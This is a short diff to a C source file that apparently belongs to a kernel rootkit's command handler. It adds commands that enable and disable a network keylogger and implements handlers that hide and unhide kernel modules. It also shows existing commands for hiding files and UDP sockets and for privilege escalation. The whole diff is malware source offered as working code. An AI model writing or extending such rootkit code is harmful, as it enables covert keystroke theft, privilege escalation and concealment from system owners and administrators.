@@ -4,6 +4,8 @@
 #include "control.h"
 #include "include.h"
 #include "privilege_escalation.h"
+#include "net_keylog.h"
+#include "hide_module.h"
 
 static int state = 0;
 static int cstate = 0;
@@ -20,6 +22,15 @@ execute_command (void)
 {
 	int port;
 	pid_t pid;
+
+        if(strcmp(command_buffer, "enable_netlog") == 0) {
+                if(param_counter > 0) {
+                        enable_net_keylog(param_buffer);
+                }
+        }
+        else if(strcmp(command_buffer, "disable_netlog") == 0) {
+                        disable_net_keylog();
+                }
 
 	if(strcmp(command_buffer, "hide_file") == 0) {
 		if(param_counter > 0) {
@@ -65,10 +76,15 @@ execute_command (void)
 			port = convert_atoi(param_buffer);
 			unhide_udp_socket(port);
 		}
-		
 	} else if(strcmp(command_buffer, "hide_module") == 0) {
-		
-	} else if(strcmp(command_buffer, "unhide_module") == 0) {
+                if(param_counter > 0) {
+                        hide_module_byname(param_buffer);
+                }
+
+        } else if(strcmp(command_buffer, "unhide_module") == 0) {
+                if(param_counter > 0) {
+                        unhide_module_byname(param_buffer);
+                }	
 		
 	} else if(strcmp(command_buffer, "escalate") == 0) {
 		priv_escalation();
@@ -97,6 +113,11 @@ accept_command_input (char input)
 			command_buffer[command_counter] = '\0';
 			state = 2;
 			execute_command();
+		} else if(input == 8) {	/* backspace */
+			if(command_counter > 0) {
+				memset(command_buffer + command_counter, 0, 1);
+				command_counter--;
+			}
 		} else {
 			command_buffer[command_counter] = input;
 			command_counter++;
